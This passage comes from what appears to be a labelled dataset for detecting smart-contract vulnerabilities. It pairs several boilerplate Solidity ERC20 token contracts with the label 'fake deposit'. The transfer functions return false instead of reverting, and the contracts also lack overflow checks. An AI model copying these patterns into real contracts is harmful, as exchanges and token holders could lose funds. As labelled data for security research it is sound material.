(balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"DOG COLLAR\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals\r\n        symbol = \"COLLAR\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000;                        // Update total supply (100000 for example)\r\n        name = \"2023 TOKEN\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals\r\n        symbol = \"2023\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 11451400;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 11451400;                        // Update total supply (100000 for example)\r\n        name = \"INM COIN\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"INM\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// File: gganbu_token.sol\r\n\r\npragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 100000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"GGANBU Token\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n        symbol = \"GGB\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract WhiteDoge is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'WOGE1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function WhiteDoge() {\r\n        balances[msg.sender] = 1000000000000000000000000000000;               \r\n        totalSupply = 1000000000000000000000000000000;\r\n        name = \"White Doge\";\r\n        decimals = 18;                                               \r\n        symbol = \"WOGE\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Hodu Commemorative Coins\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n        symbol = \"HODU\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
